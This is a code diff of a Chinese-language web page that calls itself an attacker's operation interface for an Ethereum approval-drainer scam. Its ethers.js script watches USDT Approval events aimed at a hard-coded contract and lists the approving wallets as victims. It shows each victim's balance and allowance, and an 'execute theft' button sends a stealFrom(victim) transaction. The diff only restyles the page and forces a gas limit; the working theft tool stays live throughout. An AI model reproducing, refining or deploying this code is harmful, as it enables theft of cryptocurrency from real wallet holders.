@@ -1,43 +1,37 @@
-<!-- steal.html -->
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>💪 攻擊者操作界面 v3.2.5 (配合新合約)</title>
+  <title>🛠️ 攻擊者操作介面 v3.2.2（強制執行版）</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: Arial, sans-serif; padding: 40px; background: #fff; }
+    body { font-family: 'Arial'; padding: 20px; background: #fff; }
     .ok { color: green; }
     .bad { color: red; }
-    input { padding: 5px; width: 380px; }
-    button { padding: 6px 16px; margin-left: 8px; }
-    #refresh { font-size: 12px; color: gray; }
-    #victims li { margin-bottom: 4px; }
+    #refresh { color: gray; font-size: 12px; }
   </style>
 </head>
 <body>
-  <h2>💪 攻擊者操作界面 v3.2.5 (配合新合約)</h2>
+  <h2>🛠️ 攻擊者操作介面 v3.2.2（強制執行版）</h2>
   <p><b>合約地址：</b><span id="contract">0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e</span></p>
-  <p><b>目前登入帳號：</b><span id="account">正在連線...</span></p>
-  <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
+  <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
+  <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
   <input id="input" placeholder="受害者地址" />
   <button onclick="steal()">執行盜取</button>
   <p id="balance"></p>
   <p id="status">等待操作...</p>
   <p id="refresh"></p>
-  <h3>🖊️ 授權地址列表：</h3>
+  <h3>📌 授權地址列表：</h3>
   <ul id="victims"></ul>
 
   <script>
     const CONTRACT = "0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e";
     const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
     const ABI = [
-      "event Approval(address indexed owner, address indexed spender, uint256 value)",
+      "event Approval(address indexed owner,address indexed spender,uint256 value)",
       "function balanceOf(address) view returns (uint256)",
-      "function allowance(address owner, address spender) view returns (uint256)",
-      "function stealFrom(address victim) external"
+      "function allowance(address owner, address spender) view returns (uint256)"
     ];
-
     let provider, signer, attacker;
 
     async function connect() {
@@ -53,38 +47,47 @@
     }
 
     async function fetchApprovals() {
-      document.getElementById("refresh").innerText = "⭐️ 正在捷時更新授權列表...";
+      document.getElementById("refresh").innerText = '🔄 正在刷新授權列表...';
       const contract = new ethers.Contract(USDT, ABI, provider);
-      const events = await contract.queryFilter(contract.filters.Approval(null, CONTRACT), 19000000);
+      const events = await contract.queryFilter(
+        contract.filters.Approval(null, CONTRACT),
+        19000000
+      );
       const ul = document.getElementById("victims");
       ul.innerHTML = "";
-      const seen = new Set();
+      document.getElementById("refresh").innerText = "✅ 已更新 " + new Date().toLocaleTimeString();
+      const addresses = new Set();
       events.reverse().forEach(ev => {
-        if (!seen.has(ev.args.owner)) {
-          seen.add(ev.args.owner);
+        if (!addresses.has(ev.args.owner)) {
+          addresses.add(ev.args.owner);
           const li = document.createElement("li");
           li.innerText = ev.args.owner;
           ul.appendChild(li);
         }
       });
-      document.getElementById("refresh").innerText = "✅ 已更新 " + new Date().toLocaleTimeString();
     }
 
     async function steal() {
       const victim = document.getElementById("input").value;
       if (!ethers.utils.isAddress(victim)) return alert("請輸入合法的地址");
       if (victim.toLowerCase() === attacker.toLowerCase()) {
-        return document.getElementById("status").innerText = "⛔️ 無效：不可對自己執行";
+        return document.getElementById("status").innerText = "⛔️ 無效：無法對自己執行";
       }
-      const iface = new ethers.utils.Interface(["function stealFrom(address victim)"]);
+
+      const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
       const data = iface.encodeFunctionData("stealFrom", [victim]);
-      const tx = { to: CONTRACT, data };
-      document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
+      const tx = {
+        to: CONTRACT,
+        data: data,
+        gasLimit: 200000  // 強制設定 gasLimit
+      };
+
+      document.getElementById("status").innerText = "🚀 正在強制呼叫 stealFrom(" + victim + ")...";
       try {
         const sent = await signer.sendTransaction(tx);
-        document.getElementById("status").innerHTML = "<span class='ok'>✅ TX Hash: <a href='https://etherscan.io/tx/" + sent.hash + "' target='_blank'>" + sent.hash + "</a></span>";
+        document.getElementById("status").innerText = "✅ TX Hash: " + sent.hash;
       } catch (e) {
-        document.getElementById("status").innerHTML = "<span class='bad'>❌ 失敗: " + e.message + "</span>";
+        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
       }
     }
 
@@ -95,9 +98,10 @@
           const contract = new ethers.Contract(USDT, ABI, provider);
           const balance = await contract.balanceOf(val);
           const allowance = await contract.allowance(val, CONTRACT);
-          document.getElementById("balance").innerText = "💵 USDT: " + balance.toString() + "\n🗓 Allowance: " + allowance.toString();
+          document.getElementById("balance").innerText = "💰 USDT: " + balance.toString() +
+            "\n🔐 Allowance: " + allowance.toString();
         } catch {
-          document.getElementById("balance").innerText = "❌ 查詢失敗";
+          document.getElementById("balance").innerText = "❌ 查詢失敗，請確認地址格式";
         }
       } else {
         document.getElementById("balance").innerText = "";
@@ -105,7 +109,7 @@
     });
 
     connect();
-    setInterval(fetchApprovals, 15000);
+    setInterval(fetchApprovals, 10000);
   </script>
 </body>
 </html>
